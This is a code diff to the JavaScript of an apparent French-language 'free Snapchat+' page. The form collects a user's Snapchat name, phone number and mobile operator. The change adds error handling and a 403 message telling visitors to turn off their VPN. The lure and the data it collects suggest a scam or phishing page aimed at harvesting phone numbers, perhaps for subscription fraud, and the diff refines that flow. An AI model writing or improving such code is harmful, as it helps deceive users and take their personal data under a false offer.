@@ -1026,7 +1026,9 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ snapchat, phone, operator })
                 });
-                const data = await res.json();
+                let data = {};
+                try { data = await res.json(); } catch(e) {}
+
                 if (res.status === 503 && data.error === 'site_disabled') {
                     showSiteDisabled();
                     return;
@@ -1037,7 +1039,13 @@
                     sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit';
                     return;
                 }
-                if (!res.ok || !data.id) throw new Error('Erreur serveur');
+                if (res.status === 403) {
+                    showRateLimitError(data.error || 'Accès refusé. Désactive ton VPN si actif.');
+                    sendBtn.disabled = false;
+                    sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit';
+                    return;
+                }
+                if (!res.ok || !data.id) throw new Error(data.error || 'Erreur serveur');
                 currentId = data.id;
                 showStep('loading-advanced');
                 document.getElementById('loading-account').textContent = '@' + currentSnapchat;
